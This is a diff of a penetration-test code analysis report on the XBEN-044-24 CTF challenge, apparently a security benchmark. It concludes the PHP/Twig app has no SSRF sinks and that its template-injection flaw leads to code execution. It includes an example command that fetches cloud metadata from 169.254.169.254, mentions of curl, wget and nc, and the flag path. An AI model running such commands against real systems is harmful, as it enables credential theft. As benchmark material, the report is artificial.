+### SSRF Analysis Summary
+
+**HTTP(S) Clients:** NONE FOUND
+
+The application does not use any HTTP client libraries or functions:
+- No `file_get_contents()` calls with URLs
+- No `fopen()` with URL wrappers (http://, https://, ftp://)
+- No `curl_init()`, `curl_exec()`, or `curl_setopt()` calls
+- No Guzzle HTTP client usage
+- No other HTTP client libraries
+
+**Raw Sockets & Connect APIs:** NONE FOUND
+
+The application does not use low-level socket operations:
+- No `fsockopen()` or `pfsockopen()` calls
+- No `socket_connect()` calls
+- No `stream_socket_client()` calls
+- No raw socket operations
+
+**URL Openers & File Includes:** NONE FOUND
+
+The application does not fetch remote resources:
+- No `file_get_contents()` with user-controlled URLs
+- No `include()`, `require()`, `include_once()`, or `require_once()` with URL wrappers
+- No `readfile()` with URLs
+- All file operations are local filesystem only
+
+**Redirect & Location Handlers:** NONE FOUND
+
+The application does not implement redirects:
+- No `header('Location: ...')` calls
+- No HTTP redirect functionality
+- No "next URL" or "return URL" parameters
+
+**External Command Execution (Network-Related):** NONE FOUND
+
+While the application is vulnerable to command injection via SSTI, the application code itself does not contain:
+- No `exec()`, `system()`, `shell_exec()` calls with commands like `curl` or `wget`
+- No backtick operators with network commands
+- The SSTI vulnerability could potentially be used to execute network commands, but this is a Template Injection vulnerability, not an SSRF sink in the application code
+
+**XML/External Entity Processing:** NONE FOUND
+
+The application does not process XML:
+- No `simplexml_load_file()` or `simplexml_load_string()` calls
+- No `DOMDocument::load()` or `DOMDocument::loadXML()` calls
+- No XML parsers with external entity resolution
+
+**Image/Media Processors:** NONE FOUND
+
+The application does not process images or media:
+- No ImageMagick functions
+- No GD library functions
+- No FFmpeg usage
+- No media processing with URLs
+
+**Webhook Testers & Callback Verifiers:** NONE FOUND
+
+The application does not implement webhook or callback functionality:
+- No outbound webhook ping functionality
+- No callback verification endpoints
+- No health check notifications
+
+**SSO/OIDC Discovery & JWKS Fetchers:** NONE FOUND
+
+The application does not implement SSO or OAuth:
+- No OpenID Connect discovery endpoints
+- No JWKS (JSON Web Key Set) fetchers
+- No OAuth metadata retrievers
+- No authentication integrations
+
+**Import/Data Loaders:** NONE FOUND
+
+The application does not import data from remote sources:
+- No "Import from URL" functionality
+- No CSV/JSON/XML remote loaders
+- No RSS/Atom feed readers
+- No remote data synchronization
+
+### Code Analysis Methodology
+
+**Files Analyzed:**
+
+1. `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/index.php` (75 lines) - Main application entry point
+2. `/app/repos/xbow-validation-benchmarks/benchmarks/XBEN-044-24/app/templates/hello.html.twig` (12 lines) - Template file
+
+**Search Patterns Used:**
+
+- Function calls: `file_get_contents`, `fopen`, `curl_`, `fsockopen`, `socket_`, `stream_`
+- HTTP operations: `http://`, `https://`, `ftp://`
+- Redirect operations: `header(`, `Location:`
+- Command execution: `exec(`, `system(`, `shell_exec(`, backticks
+- XML operations: `simplexml_`, `DOMDocument`, `loadXML`
+- URL operations: `parse_url`, `filter_var` with `FILTER_VALIDATE_URL`
+
+**Results:** All searches returned ZERO matches in application code (excluding vendor libraries)
+
+### Architectural Justification
+
+The application is a **self-contained form handler** that:
+
+1. Receives POST data from a form submission
+2. Applies HTML escaping to user input
+3. Renders the input through a Twig template
+4. Returns the rendered HTML to the client
+
+There are no features that require outbound network requests:
+- No external API integrations
+- No webhook notifications
+- No remote data fetching
+- No SSO authentication flows
+- No image processing from URLs
+- No proxy functionality
+
+### Security Implications
+
+**SSRF Risk Level:** NONE
+
+The absence of SSRF sinks means attackers cannot:
+- Scan internal networks from the server
+- Access cloud metadata endpoints (AWS EC2 metadata at 169.254.169.254)
+- Bypass firewall rules by proxying requests through the server
+- Port scan internal services
+- Access internal APIs or microservices
+- Retrieve sensitive data from internal resources
+
+However, it is important to note that while there are no SSRF sinks in the application code, the **SSTI vulnerability (documented in Section 9) could potentially be leveraged to achieve similar outcomes** through remote code execution. An attacker who achieves RCE via template injection could:
+
+- Execute commands like `curl http://169.254.169.254/latest/meta-data/` to access cloud metadata
+- Use command-line tools (`wget`, `curl`, `nc`) to make outbound requests
+- Scan internal networks using network utilities available in the container
+
+This demonstrates that **SSTI/RCE vulnerabilities are strictly more severe than SSRF vulnerabilities** because they enable SSRF-like attacks as a subset of their broader exploitation capabilities.
+
+### Network Surface Compliance
+
+**All analyzed components are network-accessible:**
+- Primary entry point: `POST /index.php` (analyzed for SSRF sinks)
+- Template file: `hello.html.twig` (analyzed for SSRF patterns)
+
+**No local-only components were included in this analysis.**
 
 ### Conclusion
 
-**No SSRF sinks exist in the network-accessible components of this application.**
-
-The application:
-- ✅ Makes no outbound HTTP/HTTPS requests
-- ✅ Does not fetch remote resources
-- ✅ Does not process user-supplied URLs
-- ✅ Does not perform DNS lookups based on user input
-- ✅ Uses only static file includes with hardcoded paths
-- ✅ Employs `Twig_Loader_String` which does not access files or URLs
-
-**Indirect SSRF Potential:**
-SSRF capabilities can be achieved **after** exploiting the SSTI vulnerability to gain RCE, but this is a consequence of RCE, not a standalone SSRF vulnerability.
-
-**For penetration testing purposes:** Focus on the SSTI→RCE attack path (documented in Section 9) rather than SSRF techniques.
+The XBEN-044-24 application contains **ZERO SSRF sinks**. The attack surface for this application is entirely focused on the Server-Side Template Injection vulnerability documented in Section 9, which is far more critical than SSRF as it enables direct remote code execution without requiring intermediate SSRF-based exploitation techniques.
 
 ---
 
-## Recommendations for Future Security Enhancements
+**END OF PENETRATION TEST CODE ANALYSIS REPORT**
 
-While this is a CTF challenge designed to be vulnerable, if this were a production application, the following changes would be recommended:
-
-1. **Replace Twig_Loader_String:** Use `Twig_Loader_Filesystem` with a whitelist of allowed templates
-2. **Enable Sandbox:** Remove the sandbox removal code (lines 40-42) and enforce strict sandbox policies
-3. **Upgrade Twig:** Update to Twig 3.x with all security patches
-4. **Disable Debug Mode:** Set `'debug' => false'` in production
-5. **Input Validation:** Implement strict input validation blocking template syntax characters
-6. **Add Authentication:** Implement user authentication if endpoints should be protected
-7. **Implement HTTPS:** Configure SSL/TLS for encryption in transit
-8. **Security Headers:** Add CSP, X-Frame-Options, HSTS, etc.
-9. **Remove Unused Extensions:** Uninstall `pdo_mysql` if not needed
-
----
-
-**Report Completed:** 2025-01-30  
-**Application:** XBEN-044-24 CTF Challenge  
-**Analysis Type:** Comprehensive Security-Focused Code Review for Penetration Testing  
+**Analysis Generated:** 2026-03-09  
+**Application:** XBEN-044-24 (Twig SSTI CTF Challenge)  
+**Technology Stack:** PHP 8.0, Twig 1.19.0, Apache 2.4, Docker  
 **Primary Vulnerability:** Server-Side Template Injection (SSTI) → Remote Code Execution (RCE)  
-**Exploitation Complexity:** LOW - Single POST parameter to flag extraction  
-**Attack Surface:** 1 network-accessible endpoint, 1 exploitable sink  
-
-**Win Condition:** Extract flag from `/flag.txt` via SSTI→RCE exploitation chain.
+**Attack Surface:** Single POST endpoint at `/index.php` (unauthenticated, publicly accessible)  
+**Critical Finding:** Flag stored in `/flag.txt` accessible via SSTI exploitation
